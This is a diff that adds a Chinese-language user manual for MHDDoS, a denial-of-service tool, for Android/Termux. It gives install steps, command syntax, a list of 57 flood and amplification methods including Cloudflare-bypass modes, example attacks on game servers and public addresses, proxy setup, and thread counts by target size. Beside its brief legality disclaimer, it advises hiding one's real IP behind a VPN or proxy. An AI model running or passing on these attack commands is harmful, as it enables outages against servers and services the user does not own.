@@ -1,0 +1,189 @@
+╔══════════════════════════════════════════════════════════════════╗
+║                    MHDDoS 使用手冊 v1.0                          ║
+║                 57種攻擊方法 - 壓力測試工具                       ║
+║                 Android/Termux 支援版本                          ║
+╚══════════════════════════════════════════════════════════════════╝
+
+【重要聲明】
+⚠️ 本工具僅用於合法的安全測試和教育目的
+⚠️ 未經授權使用DDoS工具是違法行為
+⚠️ 請遵守當地法律法規，僅測試自己擁有的伺服器
+
+
+【Android/Termux 設定】
+
+安裝步驟：
+  termux-setup-storage
+  pkg update && pkg upgrade -y
+  pkg install python git
+  git clone https://github.com/MatrixTM/MHDDoS.git
+  cd MHDDoS
+  pip install -r requirements.txt
+
+或使用內建腳本：
+  bash termux-setup.sh
+
+⚠️ Layer4 方法（SYN, ICMP, AMP類）需要 ROOT 權限
+   請安裝 tsu 並在 root 環境下執行
+⚠️ Layer7 方法（GET, POST, CFB等）不需 root 即可使用
+
+
+【命令格式】
+
+▶ Layer4 攻擊（無代理）
+   python start.py <方法> <IP:端口> <線程數> <持續時間>
+
+▶ Layer4 攻擊（使用代理）
+   python start.py <方法> <IP:端口> <線程數> <持續時間> <代理類型> <代理列表>
+
+▶ Layer7 攻擊
+   python start.py <方法> <URL> <代理類型> <線程數> <代理列表> <RPC> <持續時間>
+
+
+【參數說明】
+┌──────────┬────────────────────────────────┬─────────────┐
+│ 參數     │ 說明                           │ 範例        │
+├──────────┼────────────────────────────────┼─────────────┤
+│ 方法     │ 攻擊類型                       │ GET, UDP    │
+│ IP:端口  │ 目標地址                       │ 1.1.1.1:80  │
+│ URL      │ 目標網址                       │ http://x.com│
+│ 線程數   │ 同時連接數                     │ 100, 500    │
+│ 持續時間 │ 攻擊秒數                       │ 60, 300     │
+│ 代理類型 │ 0=全部 1=HTTP 4=SOCKS4 5=SOCKS5│ 0           │
+│ 代理列表 │ 代理文件路徑，0=不使用          │ proxies.txt │
+│ RPC      │ Layer7專用，通常設0            │ 0           │
+└──────────┴────────────────────────────────┴─────────────┘
+
+
+【攻擊方法完整列表】
+
+▶ Layer4 方法（21種）
+   TCP, MINECRAFT, DNS, MCBOT, SYN, CHAR, NTP, UDP, FIVEM-TOKEN, 
+   TS3, CLDAP, ARD, OVH-UDP, RDP, MEM, ICMP, CPS, FIVEM, MCPE, 
+   VSE, CONNECTION
+
+▶ Layer7 方法（26種）
+   APACHE, BYPASS, PPS, BOT, COOKIE, CFB, TOR, OVH, STOMP, POST, 
+   DOWNLOADER, AVB, STRESS, GSB, EVEN, GET, BOMB, HEAD, CFBUAM, 
+   RHEX, XMLRPC, DYN, KILLER, DGB, NULL, SLOW
+
+▶ 工具類方法（7種）
+   PING, CHECK, DNS, INFO, CFIP, DSTAT, TSSRV
+
+▶ 查看所有方法
+   python start.py HELP
+
+
+【實戰範例】
+
+1. 本地測試 - UDP攻擊
+   python start.py UDP 127.0.0.1:8080 100 30
+
+2. 本地測試 - TCP攻擊
+   python start.py TCP 127.0.0.1:8080 500 60
+
+3. 本地測試 - HTTP GET攻擊
+   python start.py GET http://127.0.0.1:8080 0 100 0 0 30
+
+4. 攻擊Minecraft伺服器（Java版）
+   python start.py MINECRAFT 192.168.1.100:25565 500 60
+
+5. 攻擊Minecraft伺服器（基岩版）
+   python start.py MCBOT 192.168.1.100:19132 500 60
+
+6. 使用代理的HTTP攻擊
+   python start.py GET https://example.com 0 200 proxies.txt 0 60
+
+7. SYN洪水攻擊
+   python start.py SYN 1.1.1.1:80 1000 30
+
+8. 同時攻擊多個目標（開多個終端）
+   終端1: python start.py UDP 目標1:80 500 300
+   終端2: python start.py TCP 目標2:80 500 300
+
+
+【代理伺服器配置】
+
+1. 代理文件格式（proxies.txt）：
+   protocol://username:password@ip:port
+   或
+   ip:port
+
+2. 範例：
+   http://user:pass@1.2.3.4:8080
+   socks5://5.6.7.8:1080
+   9.10.11.12:3128
+
+3. 程序會自動下載代理（如果proxies.txt不存在）
+
+
+【常用快速命令】
+
+攻擊本地端口23333：
+  python start.py UDP 127.0.0.1:23333 100 30
+
+攻擊本地端口24444：
+  python start.py UDP 127.0.0.1:24444 100 30
+
+攻擊本地HTTP伺服器：
+  python start.py GET http://127.0.0.1:23333 0 50 0 0 20
+
+
+【常見問題】
+
+Q1: 顯示 "ModuleNotFoundError: No module named 'PyRoxy'"
+A1: 手動安裝PyRoxy或使用Git安裝
+
+Q2: 程式直接結束沒有執行攻擊
+A2: 你必須提供參數，不能只執行 python start.py
+
+Q3: 如何停止攻擊？
+A3: 按 Ctrl + C
+
+Q4: 警告訊息 DeprecationWarning
+A4: 可以忽略，不影響功能
+
+Q5: 找不到 proxies.txt
+A5: 使用 0 代替代理列表，或創建空白文件
+
+
+【攻擊強度建議】
+
+┌──────────────┬─────────────────────────┐
+│ 場景         │ 建議線程數               │
+├──────────────┼─────────────────────────┤
+│ 本地測試     │ 10 - 100                │
+│ 小型伺服器   │ 100 - 500               │
+│ 中型伺服器   │ 500 - 2000              │
+│ 壓力測試     │ 2000 - 10000            │
+└──────────────┴─────────────────────────┘
+
+⚠️ 過高的線程數可能導致你的電腦當機
+
+
+【停止所有攻擊的方法】
+
+1. 每個終端按 Ctrl + C
+2. 關閉命令提示字元視窗
+3. 使用工作管理員結束python程序
+
+
+【注意事項】
+
+✓ 僅測試自己擁有授權的伺服器
+✓ 建議先在本地環境（127.0.0.1）測試
+✓ 使用VPN或代理可隱藏真實IP
+✓ 某些防護系統（Cloudflare）會阻擋攻擊
+✓ 注意不要違反ISP服務條款
+
+
+【緊急聯絡】
+
+如有問題，請提供：
+1. 完整的錯誤訊息
+2. 使用的命令
+3. Python版本
+
+══════════════════════════════════════════════════════════════════
+                         使用愉快，請合法使用！
+══════════════════════════════════════════════════════════════════
